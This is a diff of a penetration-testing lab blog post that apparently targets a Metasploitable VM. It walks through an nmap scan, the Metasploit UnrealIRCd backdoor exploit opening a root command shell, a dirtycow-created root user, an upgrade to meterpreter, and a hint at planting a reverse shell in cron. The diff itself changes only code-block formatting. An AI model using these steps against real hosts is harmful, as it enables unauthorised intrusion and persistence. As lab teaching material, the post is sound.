@@ -39,7 +39,7 @@ We'll start by loading our VMs. We will log in to the Kali VM;`root/toor` is the
 
 The nmap tool is your friend. We can find out a lot in a lab scenario by just hammering the box with nmap. We'll use really aggressive options since we don't need to worry about tripping an IDS/IPS. It's worth the time to really get to know nmap in depth, since it's a very useful tool for this stage of a pentest or CTF. You can find a great [nmap cheat sheet at stationX](https://www.stationx.net/nmap-cheat-sheet/).
 
-```
+{{< highlight markdown >}}
 root@kali:~# nmap -A -T5 -p- 192.168.194.136
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-29 22:59 EST
 Nmap scan report for 192.168.194.136
@@ -163,7 +163,7 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 209.19 seconds
-```
+{{< / highlight >}}
 
 So yeah. There's a lot to hack there. If you want to take it a step further, you can use the `--script` arg and supply a script. There's a lot of good ones that you get for free with nmap in Kali by default, but also of note:[https://github.com/vulnersCom/nmap-vulners](https://github.com/vulnersCom/nmap-vulners)
 
@@ -181,7 +181,7 @@ Most hosts won't have this many vulnerabilities, but given this is a test box sp
 
 Now that we picked a target service on our target machine, let's start trying to get access. Since we found a vulnerability with an exploit available in metasploit, let's fire up the console and use it.
 
-```
+{{< highlight markdown >}}
 msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > options
 
@@ -219,11 +219,11 @@ msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
 [*] Matching...
 [*] A is input...
 [*] Command shell session 1 opened (192.168.194.139:4444 -> 192.168.194.136:40211) at 2018-11-29 23:15:01 -0500
-```
+{{< / highlight >}}
 
 We launch the msfconsole, select the exploit with `use`, check the `options`, set the RHOST (target) address, and run it with `exploit`. Now we have a shell.
 
-```
+{{< highlight markdown >}}
 ls
 Donation
 LICENSE
@@ -250,11 +250,11 @@ firefart
 
 id
 uid=0(firefart) gid=0(root)
-```
+{{< / highlight >}}
 
 The first bit of output is from the ls command. Then we check who we are with `whoami` and `id`. I'm user `firefart` because I previously ran [a dirty cow exploit](https://github.com/FireFart/dirtycow/blob/master/dirty.c) on this same box, which created the user firefart with a 0:0 uid:gid. The username is just semantics though, uid of 0 means that we got root on this box from very little effort.From there, we can improve our shell easily with metasploit, plant a reverse shell in cron, or really whatever we want, because we got root. Here's an example of upgrading our shell session (1) to a meterpreter shell, and using that to get a real shell with readline and all the usual shell goodies on the target host.
 
-```
+{{< highlight markdown >}}
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > use post/multi/manage/shell_to_meter
 preter
 msf post(multi/manage/shell_to_meterpreter) > options
@@ -319,7 +319,7 @@ firefart
 firefart@metasploitable:/etc/unreal# id
 uid=0(firefart) gid=0(root)
 firefart@metasploitable:/etc/unreal#
-```
+{{< / highlight >}}
 
 ## Summary/Next Steps
 
